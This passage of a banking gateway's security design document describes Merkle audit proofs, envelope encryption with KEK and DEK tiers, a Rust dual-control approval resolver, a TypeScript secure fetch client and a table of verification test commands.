To allow independent compliance officers to audit whether a specific payment order or HITL decision was incorporated into the official ledger without disclosing unrelated transactions:
- **Leaf Hashing (Domain Separation `0x00`):**
  $$\text{LeafHash} = \text{SHA-256}(0\text{x}00 \parallel \text{transaction\_bytes})$$
- **Internal Node Hashing (Domain Separation `0x01`):**
  $$\text{NodeHash} = \text{SHA-256}(0\text{x}01 \parallel \text{LeftChildHash} \parallel \text{RightChildHash})$$
- **Inclusion Proof (`MerkleInclusionProof`):**
  Yields an $O(\log N)$ proof path verified independently in $< 1\text{ ms}$ on any standard client.

```
                          RFC 6962 MERKLE TREE AUDIT TRAIL
                                   Root Hash (R)
                                  /            \
                       Node H_01                  Node H_23
                      /         \                /         \
                 Leaf L_0     Leaf L_1      Leaf L_2     Leaf L_3
                 (0x00||Tx0)  (0x00||Tx1)   (0x00||Tx2)  (0x00||Tx3)
```

---

## 4. Headless Secrets Management & Envelope Encryption

### 4.1. Deconstruction of Desktop Keystore Breakage

In the Desktop architecture:
- `liva-native-core/src/keystore.rs` invokes Windows DPAPI (`CryptProtectData` / `CryptUnprotectData`).
- When running in non-Windows environments (Linux, Docker, Kubernetes), `#[cfg(not(windows))]` code returns `KeyError::Unsupported`.
- On first boot, `liva-desktop/src-tauri/src/lib.rs` executes `show_message_box`, spawning a blocking Win32 modal dialog (`MessageBoxW`). In a headless container, this causes an immediate application freeze or crash.

### 4.2. Two-Tier Server-Side Envelope Encryption (KEK + DEK)

To enable headless server deployments while maintaining banking-grade key security, LIVA implements a Two-Tier Envelope Encryption model:

```
                  SERVER-SIDE ENVELOPE ENCRYPTION ARCHITECTURE
┌─────────────────────────────────────────────────────────────────────────────┐
│ TIER 1: KEY ENCRYPTION KEY (KEK) PROVIDER (Externally Escrowed)             │
│                                                                             │
│  [Option A: HashiCorp Vault]      [Option B: HSM / KMS]     [Option C: Linux]│
│  Transit Secret Engine            PKCS#11 / AWS KMS         Kernel Keyring   │
│  (mTLS Auth + AppRole)            (FIPS 140-2 Level 3)      / Argon2id       │
│                                                                             │
│                │                               │                │           │
│                └───────────────────────┬───────┴────────────────┘           │
│                                        ▼ KEK                                │
└────────────────────────────────────────┼────────────────────────────────────┘
                                         │ Unwraps
┌────────────────────────────────────────┼────────────────────────────────────┐
│ TIER 2: DATA ENCRYPTION KEY (DEK)      ▼                                    │
│                                                                             │
│  Encrypted DEK in SQLite ────────> [AES-KeyWrap / GCM]                      │
│  (Table: system_key_vault)                 │                                │
│                                            ▼ Plaintext DEK (256-bit)        │
│                                   ┌─────────────────┐                       │
│                                   │ mlock() Buffer  │ (Zeroized on drop)    │
│                                   └────────┬────────┘                       │
└────────────────────────────────────────────┼────────────────────────────────┘
                                             │ Encrypts / Decrypts
┌────────────────────────────────────────────▼────────────────────────────────┐
│ SQLite WAL Database Frames (Transactions, Balances, PII, Audit Logs)        │
│ Cipher: AES-256-GCM v2 (HKDF-SHA256, 16-byte random IV per record)          │
└─────────────────────────────────────────────────────────────────────────────┘
```

#### Key Architecture Specifications:
1. **Key Encryption Key (KEK):**
   - **Enterprise Production:** Rooted in **HashiCorp Vault Transit Engine** or **PKCS#11 Hardware Security Module (HSM)**. LIVA authenticates to Vault via mutual TLS (mTLS) with client certificates rotated via automated certificate managers.
   - **On-Premise Linux Air-Gapped:** Rooted in the **Linux Kernel Keyring** (`keyctl`), loaded into kernel protected memory during container initialization.
   - **Container Passphrase Derivation & Minimum Entropy Validation:** When operating without an external Vault/HSM, the master KEK is derived via **Argon2id** (`m=65536, t=3, p=4`) using a 256-bit cryptographically random salt provisioned via encrypted systemd credentials (`systemd-creds`) or container secrets.
     - **Entropy Enforcement (>= 128 bits):** The gateway initialization routine strictly enforces minimum entropy validation on any passphrase input. Passphrases must be at least 16 characters in length, contain a mixture of uppercase, lowercase, numeric, and symbol character sets (Shannon entropy $\ge 128$ bits), and pass dictionary strength screening (zxcvbn score $\ge 4$). Inputs failing this threshold are rejected with `KekDerivationError::InsufficientEntropy`, aborting server startup.
2. **Data Encryption Key (DEK):**
   - A 256-bit cryptographic key generated via system CSPRNG (`rand::rngs::OsRng`).
   - The DEK is encrypted under the KEK and stored in SQLite table `system_key_vault`.
   - In-memory DEK buffers are wrapped in `secstr::SecStr` and pinned using POSIX `mlock()` / Windows `VirtualLock()` to prevent memory paging to disk swap.
   - **Container Privilege Requirement (`cap_add: [IPC_LOCK]`):** In unprivileged container runtimes (Docker, Kubernetes, Podman), invoking `mlock()` fails with `EPERM` unless the container process is granted the `CAP_IPC_LOCK` capability. All production deployment manifests must explicitly specify:
     ```yaml
     # docker-compose.yml
     services:
       liva-banking-gateway:
         image: liva-banking-gateway:latest
         cap_add:
           - IPC_LOCK
         security_opt:
           - no-new-privileges:true
         ulimits:
           memlock:
             soft: -1
             hard: -1
     ```
     In Kubernetes, pod manifests must specify `securityContext.capabilities.add: ["IPC_LOCK"]`.
   - **Runtime Fallback & Degradation Logging:** If `mlock()` returns `EPERM` at runtime (e.g. in restricted environments), the engine logs a high-severity alert: `SECURITY_DEGRADATION: mlock() failed with EPERM; CAP_IPC_LOCK missing; falling back to in-memory zeroize only`. The buffer remains protected in userland memory and is wiped via `zeroize::ZeroizeOnDrop` upon deallocation.
3. **Zero-Knowledge Web Clients:**
   - Web browser clients **never receive, hold, or process** master keys, KEKs, or DEKs.
   - All cryptographic transformations occur exclusively within `liva-native-core` on the server.

---

### 4.3. Continuity of Debt C3 Release Key Guard

The release guard implemented in `liva-native-core/src/crypto.rs` (Lines 92–99) is maintained without compromise:
```rust
pub const DEFAULT_ENCRYPTION_KEY: &str = "00000000000000000000000000000000";

#[cfg(not(debug_assertions))]
{
    if key_str == DEFAULT_ENCRYPTION_KEY {
        panic!(
            "CRITICAL SECURITY GUARD [Debt C3]: DEFAULT_ENCRYPTION_KEY is strictly forbidden in release builds! Refusing to initialize with known public passphrase. Configure KEK provider or set LIVA_ENCRYPTION_KEY."
        );
    }
}
```
In release builds, failure to authenticate to the KEK provider or supply a valid key causes an immediate fail-closed abort (`std::process::exit(1)`), preventing insecure fallback operation.

---

## 5. Complete Implementation Blueprints

### 5.1. Rust: Dual Control Web Resolver (`resolve_hitl_web`)

```rust
//! liva-native-core/src/banking/compliance/web_resolver.rs
//! =======================================================
//! Server-asserted Dual Control Resolver complying with Circular 09/2020/TT-NHNN.

use std::sync::Arc;
use chrono::Utc;
use rusqlite::params;
use serde::{Deserialize, Serialize};

use crate::AppState;
use crate::banking::compliance::audit_ledger::{compute_hmac_sha256, AuditLedger};
use crate::banking::compliance::maker_checker::{AuthorizationRole, HitlActionType};
use crate::banking::compliance::security::get_audit_key;

#[derive(Debug, Clone, Deserialize)]
pub struct ResolveHitlWebRequest {
    pub proposal_id: String,
    pub hitl_token: String,
    pub decision: String, // "APPROVE" or "REJECT"
    pub decision_notes: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct ResolveHitlWebResponse {
    pub success: bool,
    pub proposal_id: String,
    pub checker_id: String,
    pub checker_employee_id: String,
    pub resolved_at: i64,
    pub digital_signature: String,
}

#[derive(Debug, thiserror::Error)]
pub enum BankingWebSecurityError {
    #[error("Xác thực vai trò thất bại: Yêu cầu CHECKER nhưng người dùng là '{actual}'")]
    UnauthorizedRole { actual: String },

    #[error("Vi phạm kiểm soát kép Thông tư 09: Người tạo đề xuất (Mã NV: {maker_employee_id}) và người phê duyệt (Mã NV: {checker_employee_id}) thuộc cùng một nhân sự/tài khoản")]
    SelfApprovalProhibited {
        maker_employee_id: String,
        checker_employee_id: String,
    },

    #[error("Token HITL không hợp lệ hoặc chữ ký giả mạo")]
    InvalidTokenSignature,

    #[error("Token HITL đã hết hạn (giới hạn hiệu lực 15 phút)")]
    TokenExpired,

    #[error("Đề xuất đã được xử lý bởi phiên làm việc khác hoặc xảy ra xung đột đồng thời")]
    ConcurrentModificationOrAlreadyConsumed,

    #[error("Lỗi cơ sở dữ liệu nội bộ (Mã tham chiếu lỗi: {correlation_id})")]
    Database { correlation_id: String },

    #[error("Lỗi tuần tự hóa: {0}")]
    Serialization(#[from] serde_json::Error),
}

/// Helper to mask internal database errors and prevent SQL schema disclosure.
fn map_db_error(context: &str, err: rusqlite::Error) -> BankingWebSecurityError {
    let correlation_id = uuid::Uuid::new_v4().to_string();
    tracing::error!(
        target: "banking::security::db",
        correlation_id = %correlation_id,
        context = %context,
        error = ?err,
        "Masked internal database error returned to client"
    );
    BankingWebSecurityError::Database { correlation_id }
}

/// Server-asserted Dual Control Resolver for Web Gateway enforcing Circular 09/2020/TT-NHNN.
pub async fn resolve_hitl_web(
    state: Arc<AppState>,
    session: &AuthenticatedSession,
    req: ResolveHitlWebRequest,
) -> Result<ResolveHitlWebResponse, BankingWebSecurityError> {
    use subtle::ConstantTimeEq;

    // 1. Enforce Checker role authorization
    if session.role != AuthorizationRole::Checker {
        return Err(BankingWebSecurityError::UnauthorizedRole {
            actual: format!("{:?}", session.role),
        });
    }

    let now = Utc::now().timestamp();
    let audit_key = get_audit_key(&state);

    // 2. Acquire database writer checkout
    let mut conn = state
        .db
        .writer
        .get()
        .map_err(|e| map_db_error("acquire_writer_checkout", rusqlite::Error::ToSqlConversionFailure(Box::new(std::io::Error::new(
            std::io::ErrorKind::ConnectionRefused,
            format!("DB Checkout pool error: {e}"),
        )))))?;

    // 3. Fetch proposal record under exclusive transaction
    let tx = conn
        .transaction()
        .map_err(|e| map_db_error("begin_exclusive_tx", e))?;

    let (maker_user_id, maker_employee_id, maker_citizen_id_hash, status, expires_at, proposal_hash): (
        String,
        String,
        String,
        String,
        i64,
        String,
    ) = tx
        .query_row(
            "SELECT maker_user_id, maker_employee_id, maker_citizen_id_hash, status, expires_at, proposal_hash 
             FROM hitl_proposals WHERE id = ?1",
            params![&req.proposal_id],
            |row| {
                Ok((
                    row.get(0)?,
                    row.get(1)?,
                    row.get(2)?,
                    row.get(3)?,
                    row.get(4)?,
                    row.get(5)?,
                ))
            },
        )
        .map_err(|e| map_db_error("fetch_proposal_record", e))?;

    // 4. Circular 09 Fail-Closed Assertion: Natural Person Multi-Account Self-Approval Prohibition
    let maker_emp = maker_employee_id.trim();
    let checker_emp = session.employee_id.trim();
    let maker_cccd = maker_citizen_id_hash.trim();
    let checker_cccd = session.citizen_id_hash.trim();
    let maker_usr = maker_user_id.trim().to_lowercase();
    let checker_usr = session.user_id.trim().to_lowercase();

    if maker_emp == checker_emp || maker_cccd == checker_cccd || maker_usr == checker_usr {
        tracing::error!(
            target: "security::dual_control",
            maker_user = %maker_user_id,
            maker_employee = %maker_employee_id,
            checker_user = %session.user_id,
            checker_employee = %session.employee_id,
            proposal_id = %req.proposal_id,
            "CRITICAL SECURITY ALERT: Human operator attempted self-approval across sessions/accounts"
        );
        return Err(BankingWebSecurityError::SelfApprovalProhibited {
            maker_employee_id,
            checker_employee_id: session.employee_id.clone(),
        });
    }

    // 5. Assert Proposal Status & TTL
    if status != "PENDING" {
        return Err(BankingWebSecurityError::ConcurrentModificationOrAlreadyConsumed);
    }
    if now > expires_at {
        return Err(BankingWebSecurityError::TokenExpired);
    }

    // 6. Verify HMAC-SHA256 Token Signature in Constant Time (subtle::ConstantTimeEq)
    let expected_sig_bytes = compute_hmac_sha256(
        &audit_key,
        format!(
            "{}|{}|{}|{}|{}|{}",
            req.proposal_id, maker_user_id, maker_employee_id, maker_citizen_id_hash, expires_at, proposal_hash
        )
        .as_bytes(),
    );
    let expected_sig = hex::encode(expected_sig_bytes);

    let token_bytes = req.hitl_token.as_bytes();
    let expected_bytes = expected_sig.as_bytes();

    if token_bytes.len() != expected_bytes.len()
        || token_bytes.ct_eq(expected_bytes).unwrap_u8() != 1
    {
        return Err(BankingWebSecurityError::InvalidTokenSignature);
    }

    // 7. Compute Non-Repudiation Checker Digital Signature
    let decision_sig_bytes = compute_hmac_sha256(
        &audit_key,
        format!(
            "DECISION|{}|{}|{}|{}|{}|{}|{}",
            req.proposal_id,
            maker_employee_id,
            session.employee_id,
            session.user_id,
            req.decision,
            now,
            proposal_hash
        )
        .as_bytes(),
    );
    let digital_signature = hex::encode(decision_sig_bytes);

    // 8. Atomic State Transition (Guarded Update)
    let rows_affected = tx
        .execute(
            "UPDATE hitl_proposals 
             SET status = ?1, 
                 checker_user_id = ?2, 
                 checker_employee_id = ?3,
                 resolved_at = ?4, 
                 decision_notes = ?5, 
                 token_consumed = 1, 
                 signature = ?6 
             WHERE id = ?7 AND status = 'PENDING' AND token_consumed = 0 AND expires_at >= ?4",
            params![
                req.decision,
                session.user_id,
                session.employee_id,
                now,
                req.decision_notes.as_deref().unwrap_or("Approved via Web Portal"),
                digital_signature,
                req.proposal_id
            ],
        )
        .map_err(|e| map_db_error("atomic_status_update", e))?;

    if rows_affected == 0 {
        return Err(BankingWebSecurityError::ConcurrentModificationOrAlreadyConsumed);
    }

    // 9. Append to Immutable Forward HMAC Audit Chain
    let audit_payload = serde_json::to_string(&serde_json::json!({
        "proposal_id": req.proposal_id,
        "maker_user_id": maker_user_id,
        "maker_employee_id": maker_employee_id,
        "checker_user_id": session.user_id,
        "checker_employee_id": session.employee_id,
        "decision": req.decision,
        "resolved_at": now,
        "signature": digital_signature
    }))?;

    AuditLedger::append(
        &tx,
        &audit_key,
        "CIRCULAR_09_DUAL_CONTROL_DECISION",
        &session.user_id,
        &audit_payload,
    )
    .map_err(|e| map_db_error("audit_ledger_append", e))?;

    tx.commit()
        .map_err(|e| map_db_error("commit_transaction", e))?;

    Ok(ResolveHitlWebResponse {
        success: true,
        proposal_id: req.proposal_id,
        checker_id: session.user_id.clone(),
        checker_employee_id: session.employee_id.clone(),
        resolved_at: now,
        digital_signature,
    })
}
```

---

### 5.2. TypeScript: Axios/Fetch Security Interceptor (`securityClient.ts`)

```typescript
/**
 * liva-ui/src/api/securityClient.ts
 * =================================
 * Secure API transport enforcing Decree 13 and Circular 09 constraints.
 */

export interface SecurityClientConfig {
  baseUrl?: string;
  csrfHeaderName?: string;
}

export class SecurityClient {
  private readonly baseUrl: string;
  private readonly csrfHeaderName: string;
  private csrfToken: string | null = null;

  constructor(config: SecurityClientConfig = {}) {
    this.baseUrl = config.baseUrl || '/api/v1';
    this.csrfHeaderName = config.csrfHeaderName || 'X-CSRF-Token';
  }

  public setCsrfToken(token: string): void {
    this.csrfToken = token;
  }

  public async fetchWithSecurity<T>(
    endpoint: string,
    options: RequestInit = {}
  ): Promise<T> {
    const url = `${this.baseUrl}${endpoint}`;
    const headers = new Headers(options.headers || {});

    // 1. Mandatory JSON header for non-multipart
    if (!headers.has('Content-Type') && !(options.body instanceof FormData)) {
      headers.set('Content-Type', 'application/json');
    }

    // 2. Anti-CSRF Token injection on mutating requests
    const method = (options.method || 'GET').toUpperCase();
    if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(method)) {
      if (this.csrfToken) {
        headers.set(this.csrfHeaderName, this.csrfToken);
      }
    }

    // 3. Enforce credentials for HttpOnly SameSite=Strict cookies
    const fetchOptions: RequestInit = {
      ...options,
      headers,
      credentials: 'same-origin',
    };

    const response = await fetch(url, fetchOptions);

    if (response.status === 401 || response.status === 403) {
      // Session expired or CSRF token rejected -> trigger lock
      window.location.href = '/lock?reason=session_invalid';
      throw new Error(`Security Exception: HTTP ${response.status}`);
    }

    if (!response.ok) {
      const errorPayload = await response.json().catch(() => ({}));
      throw new Error(errorPayload.error || `HTTP Error ${response.status}`);
    }

    return await response.json();
  }
}

export const securityApi = new SecurityClient();
```

---

## 6. Security Verification & Compliance Audit Matrix

Independent auditors (Forensic Auditors, SBV Examiners, and A05 Cyber Security Inspectors) can deterministically verify all security controls using the following automated matrix:

| Verification Target | Test Category | Execution Command / Check | Expected Invariant |
|---|---|---|---|
| **Release Key Guard [Debt C3]** | Unit / Compile | `cargo test -p liva-native-core crypto::tests::test_check_release_key_guard -j 2 -- --test-threads 2` | Rejects `DEFAULT_ENCRYPTION_KEY` in release mode (`Err`); passes in debug. |
| **Circular 09 Account Self-Approval** | Adversarial Unit | `cargo test -p liva-native-core banking::compliance::maker_checker::tests::test_maker_checker_fail_closed_on_self_approval -j 2 -- --test-threads 2` | Fails closed with `SelfApprovalProhibited` when `maker_user_id == checker_user_id`. |
| **Circular 09 Natural Person Multi-Account** | Adversarial Unit | `cargo test -p liva-native-core banking::compliance::maker_checker::tests::test_maker_checker_fail_closed_on_same_employee_id -j 2 -- --test-threads 2` | Fails closed with `SelfApprovalProhibited` when `maker_employee_id == checker_employee_id` or `citizen_id_hash` matches. |
| **Constant-Time Token Verification** | Cryptographic Unit | `cargo test -p liva-native-core banking::compliance::maker_checker::tests::test_hitl_token_constant_time_comparison -j 2 -- --test-threads 2` | Employs `subtle::ConstantTimeEq`; zero timing side-channel across mismatched candidate prefixes. |
| **Single-Use Token Expiry** | Adversarial Unit | `cargo test -p liva-native-core banking::compliance::maker_checker::tests::test_maker_checker_token_ttl_expiration -j 2 -- --test-threads 2` | Rejects token submission after 901 seconds with `TokenExpired`. |
| **Zero-Egress Netfilter** | Adversarial Integration | `cargo test -p liva-native-core banking::compliance::security::tests::test_zero_egress_netfilter_blocks_external_destinations -j 2 -- --test-threads 2` | Blocks non-127.0.0.1 destinations; increments `blocked_attempts`. |
| **RFC 6962 Merkle Inclusion** | Cryptographic Unit | `cargo test -p liva-native-core banking::compliance::merkle_audit::tests -j 2 -- --test-threads 2` | Validates $O(\log N)$ inclusion proof path; rejects tampered leaf hash. |
| **HMAC Forward Audit Chain** | Tamper Resistance | `cargo test -p liva-native-core banking::compliance::audit_ledger::tests::test_audit_ledger_chain_and_tamper_detection -j 2 -- --test-threads 2` | Detecting tampered sequence ID; verifies `is_intact == false`. |
| **Database Error Masking** | API Security Unit | `cargo test -p liva-native-core banking::compliance::web_resolver::tests::test_database_error_masked_with_correlation_id -j 2 -- --test-threads 2` | Verifies SQL syntax/constraint errors return sanitized correlation ID without table/column leak. |
| **KEK Minimum Entropy (>= 128 bits)** | Cryptographic Unit | `cargo test -p liva-native-core crypto::tests::test_kek_passphrase_entropy_enforcement -j 2 -- --test-threads 2` | Rejects weak passphrases (< 16 chars or < 128 bits entropy) with `InsufficientEntropy`. |
| **CSP Level 3 Header Pinning** | Gateway Integration | `cargo test -p liva-native-core gateway::tests::test_csp_header_pins_wss_and_blocks_wildcards -j 2 -- --test-threads 2` | Confirms `connect-src 'self' wss://banking.corp.vn;` and `navigate-to 'self';` present on all HTML responses. |
| **Vue Memory Scrubber** | Vitest Component | `npm run test:coverage -w liva-ui -- useMemoryScrubber.spec.ts` | Confirms arrays zeroed on unmount, `Uint8Array` wiped via `crypto.getRandomValues()`, and 180s hidden timer. |
| **TypeScript Type Safety** | Compiler Audit | `npx vue-tsc --noEmit -p liva-ui/tsconfig.app.json` | 0 type errors across all adapter and store definitions. |
